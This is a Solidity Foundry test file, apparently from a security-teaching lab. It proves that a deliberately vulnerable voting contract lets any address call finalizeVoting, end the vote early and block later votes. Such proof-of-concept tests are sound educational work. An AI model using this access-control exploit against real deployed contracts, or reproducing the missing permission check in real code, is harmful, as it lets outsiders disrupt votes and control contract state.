// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableVoting} from "../../src/access_control/FunctionVisibility.sol";

contract VulnerableVotingPoC is Test {
    VulnerableVoting voting;
    address owner = makeAddr("owner");
    address voter1 = makeAddr("voter1");
    address voter2 = makeAddr("voter2");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        voting = new VulnerableVoting();
    }

    function test_AttackerCanFinalizeVotingEarly() public {
        vm.prank(voter1);
        voting.vote("Alice");
        
        vm.prank(voter2);
        voting.vote("Bob");
        
        vm.prank(attacker);
        voting.finalizeVoting();

        assertTrue(voting.votingEnded(), "Voting should be ended by attacker");

        vm.prank(voter1);
        vm.expectRevert("Voting has ended");
        voting.vote("Charlie");
    }

    function test_MultipleAttackersCanFinalize() public {
        vm.prank(attacker);
        voting.finalizeVoting();
        
        address attacker2 = makeAddr("attacker2");
        vm.prank(attacker2);
        voting.finalizeVoting();
        
        assertTrue(voting.votingEnded(), "Voting should remain ended");
    }

    function test_OwnerCanAlsoFinalize() public {
        vm.prank(owner);
        voting.finalizeVoting();
        
        assertTrue(voting.votingEnded(), "Owner should be able to end voting");
    }

    function test_VotingProcessDisruption() public {
        vm.prank(attacker);
        voting.finalizeVoting();
        
        vm.prank(voter1);
        vm.expectRevert("Voting has ended");
        voting.vote("Alice");
        
        vm.prank(voter2);
        vm.expectRevert("Voting has ended");
        voting.vote("Bob");
        
        assertEq(voting.votes("Alice"), 0, "Alice should have 0 votes");
        assertEq(voting.votes("Bob"), 0, "Bob should have 0 votes");
    }
}